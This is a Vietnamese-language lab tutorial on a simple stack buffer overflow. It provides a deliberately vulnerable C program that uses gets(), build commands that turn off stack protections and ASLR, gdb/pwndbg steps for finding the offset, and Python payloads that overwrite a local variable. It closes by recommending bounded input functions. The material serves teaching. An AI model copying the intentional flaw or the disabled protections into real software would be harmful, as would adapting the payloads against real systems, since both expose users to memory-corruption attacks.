# 0x01: Simple Buffer Overflow

Buffer Overflow (tràn bộ đệm - BOF) là một lỗi bảo mật xảy ra khi chương trình ghi nhiều dữ liệu hơn kích thước vùng nhớ (buffer) được cấp phát. Khi đó, dữ liệu sẽ ghi đè lên các vùng nhớ lân cận như biến khác, con trỏ hàm, hoặc địa chỉ trả về trên stack — từ đó có thể làm chương trình crash hoặc bị chiếm quyền điều khiển.

Lỗi này đặc biệt phổ biến trong các chương trình viết bằng C/C++ do không có cơ chế kiểm tra biên tự động như các ngôn ngữ cấp cao (Python, Java…).

Trong C/C++, buffer overflow (BOF) thường xảy ra do sử dụng các hàm không kiểm tra kích thước bộ đệm hoặc kiểm tra không đầy đủ. Dưới đây là các hàm nguy hiểm phổ biến gây ra BOF:

- gets(): Đọc input cho đến khi gặp newline. Không kiểm tra kích thước buffer.
- scanf("%s", buf): %s đọc chuỗi không giới hạn độ dài. Nếu không ghi rõ kích thước → tràn.
- strcpy(dest, src): Sao chép đến khi gặp \0. Không kiểm tra kích thước dest.
- read(fd, buf, size): Nếu size > kích thước buf → BOF.

BOF thuong duoc chia thanh 2 loai: stack-based BOF va heap-based BOF dua tren vi tri bo nho bi loi. Bai lab hom nay, chung ta se tim hieu ve cach khai thac loi nay theo dang co ban nhat.


## 1) Vulnerable source

```c target.c
#include <stdio.h>

int main(int argc, char *argv[]) {
	int secret;
	char name[100];
	printf("Enter your name: ");
	gets(name);
	if (secret == 0x746f6f72) {
		printf("You win!\n");
	}
}
```

Tien hanh build 2 file binary voi kien truc 32 bit va 64 bit. De don gian, khi build ta tat het cac tinh nang bao mat nang cao nhu NX, ASLR, PIE, CANARY

```bash
gcc -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 -no-pie -m32 target.c -o target_m32
gcc -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 -no-pie -m64 target.c -o target_m64
echo 0 > /proc/sys/kernel/randomize_va_space

```

Chay thu chuong trinh:
```bash
→  0x01 ./target_m32
Enter your name: drx
→  0x01 
```

Chuong trinh cho nguoi dung nhap ten, luu vao bien **name**. Sau do kiem tra neu bien **secret** bi thay doi thanh gia tri **0x746f6f72** thi in ra dong chu thong bao *You win!*.
O day, bien **name** chi duoc khai bao co do dai 100 ky tu, nhung ham **gets(name)** lai khong kiem tra do dai chuoi do nguoi dung nhap vao, gay nen loi BOF. Ta se tim cach khai thac loi nay de sua doi bien **secret** thanh gia tri **0x746f6f72**.



## 2) Hinh dung stack frame

Stack frame cua `main` (don gian hoa):

```text
Dia chi cao
+-------------------+
| saved RIP / RET   |
+-------------------+
| saved RBP         |
+-------------------+
| secret (4 byte)   |  <== muon ghi vao day
+-------------------+
| name[100]         |  <== gets() ghi tu day
+-------------------+
Dia chi thap
```

Stack tang xuong duoi (ve dia chi thap). Khi input vuot qua 100 byte cua `name`, no se ghi tiep vao `secret`, roi toi saved frame pointer/return address.

## 3) Build binary

```bash
make
```

Tao ra:
- `target_m32`
- `target_m64`

Luu y:
- `Makefile` co dong `echo 0 > /proc/sys/kernel/randomize_va_space` de tat ASLR. Dong nay thuong can quyen root.
- Neu khong tat duoc ASLR thi van hoc duoc overflow bien cuc bo, chi la dia chi khi debug co the thay doi.

## 4) Xem stack bang pwndbg

### 4.1 Chay gdb

```bash
gdb -q ./target_m64
```

Trong `gdb`/`pwndbg`:

```gdb
break main
run
next        # di qua den gan gets
p &name
p &secret
```

Hai lenh quan trong:
- `p &name`: dia chi bat dau bo dem.
- `p &secret`: dia chi bien can ghi de.

Tinh offset:

```gdb
p/d (long)&secret - (long)&name
```

Neu ket qua la `108`, nghia la can 108 byte rac + 4 byte gia tri `root`.

### 4.2 Nhin truc tiep bo nho stack

```gdb
x/40gx $rsp      # 64-bit
# hoac
x/80wx $esp      # 32-bit
```

Mot so lenh pwndbg huu ich:
- `stack 30`: in nhanh 30 dong stack.
- `telescope $rsp 20`: xem stack de doc.
- `context`: xem tong hop thanh ghi + stack + code moi lan step.

## 5) Tao payload exploit

### m64

Offset thu duoc: 108 byte.

```bash
python3 -c 'print("A"*108 + "root")' > payload_m64
./target_m64 < payload_m64
```

Ky vong:

```text
Enter your name: You win!
```

### m32

Offset thu duoc: 100 byte.

```bash
python3 -c 'print("A"*100 + "root")' > payload_m32
./target_m32 < payload_m32
```

Ky vong:

```text
Enter your name: You win!
```

## 6) Quy trinh exploit can nho

1. Tim cho nhap lieu nguy hiem (`gets`, `scanf("%s")`, `strcpy`, ...).
2. Xac dinh bien buffer va bien muc tieu tren stack (`p &buffer`, `p &target`).
3. Tinh offset giua 2 dia chi.
4. Tao payload: `padding + gia tri can ghi`.
5. Chay thu va quan sat stack de xac nhan.

## 7) Bai hoc rut ra

- Buffer overflow khong chi de hijack RET, ma con co the doi gia tri bien logic nhu `secret`.
- `gets()` la ham nguy hiem, khong nen dung.
- Luon dung ham co gioi han do dai (`fgets`, `snprintf`, `strncpy` dung cach).
